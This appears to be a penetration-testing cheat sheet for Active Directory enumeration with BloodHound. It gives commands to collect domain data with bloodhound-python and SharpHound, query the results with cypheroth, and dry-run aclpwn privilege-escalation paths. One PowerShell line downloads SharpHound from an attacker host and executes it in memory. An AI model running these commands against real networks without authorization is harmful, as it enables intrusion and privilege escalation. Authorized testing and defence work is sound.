# bloodhound

% bloodhound, Active directory enumeration

## start neo4j server
#platform/linux #target/serve #cat/UTILS
https://neo4j.com/docs/

```bash
neo4j start
```

## bloodhound start IHM
#platform/linux #target/local #cat/RECON
https://github.com/BloodHoundAD/BloodHound

```bash
bloodhound
```

## bloodhound - collect data
#platform/linux #target/remote #port/389 #port/631 #cat/RECON
https://github.com/fox-it/BloodHound.py

```bash
bloodhound-python -d <domain> -u <user> -p <password> -c all
```

## bloodhound - collect data (alternative)
#platform/linux #target/remote #port/389 #port/631 #cat/RECON
https://github.com/fox-it/BloodHound.py

```bash
bloodhound-python -d <domain> -u <user> -p <password> -gc <global_catalog> -dc <domain_controler> -c all
```

## sharphound - collect bloodhound data
#platform/windows #target/remote #port/389 #port/631 #cat/RECON
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors

```powershell
import-module sharphound.ps1
invoke-bloodhound -collectionmethod all -domain <domain>
```

## sharphound - collect bloodhound data download and execute
#platform/windows #target/remote #port/389 #port/631 #cat/RECON
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors

```powershell
(new-object system.net.webclient).downloadstring('http://<lhost>/SharpHound.ps1') | Invoke-BloodHound -CollectionMethod All  -domain <domain>
```

## cypheroth - start
#platform/linux #target/local #cat/RECON 
Toolset that runs cypher queries against Bloodhound's Neo4j backend and saves output to spreadsheets.

https://github.com/seajaysec/cypheroth

```bash
cypheroth -u <bh_user|neo4j> -p <bh_password|exegol4thewin> -d <domain>
```

## aclpwn - from computer to domain - dry run
#platform/linux #target/local #cat/RECON 
Aclpwn.py is a tool that interacts with BloodHound to identify and exploit ACL based privilege escalation paths.

https://github.com/fox-it/aclpwn.py

```
aclpwn -f <computer_name> -ft computer -d <domain> -dry
```



